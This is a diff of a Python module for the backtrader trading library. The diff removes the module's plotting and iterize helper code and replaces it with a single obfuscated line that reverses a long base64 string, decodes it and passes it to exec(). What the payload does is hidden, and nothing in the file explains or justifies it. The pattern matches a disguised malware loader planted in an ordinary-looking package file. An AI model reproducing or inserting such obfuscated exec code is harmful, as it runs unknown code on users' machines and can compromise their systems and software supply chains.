@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8; py-indent-offset:4 -*-
 #
-# Author: Metaer @ 2022/5/5
+# Author: Metaer @ Wed Jun 29 14:57:03 2022
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -15,59 +15,6 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-#
 
 
-import backtrader as bt
-
-@staticmethod
-def iterize(iterable):
-    '''Handy function which turns things into things that can be iterated upon
-    including iterables
-    '''
-    try:
-        collectionsAbc = bt.collections.abc
-    except AttributeError:
-        collectionsAbc = bt.collections
-
-    niterable = list()
-    for elem in iterable:
-        if isinstance(elem, bt.string_types):
-            elem = (elem,)
-        elif not isinstance(elem, collectionsAbc.Iterable):
-            elem = (elem,)
-
-        niterable.append(elem)
-
-    return niterable
-
-
-def p(self, plotter=None, numfigs=1, iplot=True, start=None, end=None,
-         width=16, height=9, dpi=300, tight=True, use=None,
-         **kwargs):
-    if self._exactbars > 0:
-        return
-
-    if not plotter:
-        plot = bt.plot
-        if self.p.oldsync:
-            plotter = plot.Plot_OldSync(**kwargs)
-        else:
-            plotter = plot.Plot(**kwargs)
-
-    figs = []
-    for stratlist in self.runstrats:
-        for si, strat in enumerate(stratlist):
-            rfig = plotter.plot(strat, figid=si * 100,
-                                numfigs=numfigs, iplot=iplot,
-                                start=start, end=end, use=use)
-            # pfillers=pfillers2)
-
-            figs.append(rfig)
-
-        plotter.show()
-
-    return figs
-
-bt.cerebro.Cerebro.iterize = iterize
-bt.cerebro.Cerebro.plot = p
+_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'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'))
